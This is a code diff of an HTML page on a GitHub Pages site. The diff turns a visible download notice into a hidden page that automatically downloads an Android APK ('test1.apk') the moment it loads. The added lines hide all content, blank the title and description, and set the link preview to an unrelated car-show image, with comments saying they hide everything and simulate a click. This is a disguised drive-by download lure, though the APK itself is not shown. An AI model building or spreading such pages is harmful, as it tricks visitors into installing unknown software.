@@ -6,49 +6,41 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Начало загрузки</title>
+    <title> </title> 
     
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://94kz55hfdb-netizen.github.io/test/">
-    <meta property="og:title" content=""> 
-    <meta property="og:description" content="">
-    <meta property="og:image" content="https://94kz55hfdb-netizen.github.io/test/downloads/photo_link.jpg">
+    <meta property="og:title" content=" "> 
+    <meta property="og:description" content=" ">
+    
+    <meta property="og:image" content="https://elektromobilni.pl/wp-content/uploads/2025/09/IAA-2025-PMA.webp">
+    
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        /* ... (Стили остаются без изменений) ... */
-        .spinner { 
-            border: 8px solid #f3f3f3; 
-            border-top: 8px solid #3498db; 
-            border-radius: 50%; 
-            width: 60px; 
-            height: 60px; 
-            animation: spin 1.5s linear infinite; 
-            margin: 20px auto; 
-        }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        /* Скрываем ВСЁ видимое содержимое */
+        body { 
+            background: #000;
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden; 
+            visibility: hidden; 
+            height: 100vh;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h1>Начало загрузки...</h1>
-        <p>Начало загрузки файла <span id="filename">test1.apk</span>.</p>
-        <p>Если загрузка не началась автоматически, нажмите <a id="manual_link" href="#">здесь</a>.</p>
-    </div>
     
     <script>
         // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
         const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
+        // APK-файл с обходом кэша
         const apkUrl = repoBaseUrl + 'downloads/test1.apk?v=' + Date.now(); 
         const apkFilename = 'test1.apk'; 
         // ------------------------------------
 
         function startDownload() {
+            // Создаем невидимую ссылку, имитируем клик
             const link = document.createElement('a');
             link.href = apkUrl;
             link.download = apkFilename; 
@@ -56,16 +48,11 @@
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
-
-            document.querySelector('h1').textContent = "Загрузка началась!";
-            document.querySelector('.spinner').style.display = 'none';
         }
 
+        // Запускаем скачивание сразу после загрузки страницы
         window.onload = function() {
-            document.getElementById('manual_link').href = repoBaseUrl + 'downloads/test1.apk';
-            document.getElementById('filename').textContent = apkFilename;
-            
-            setTimeout(startDownload, 500); 
+            startDownload();
         };
     </script>
 </body>
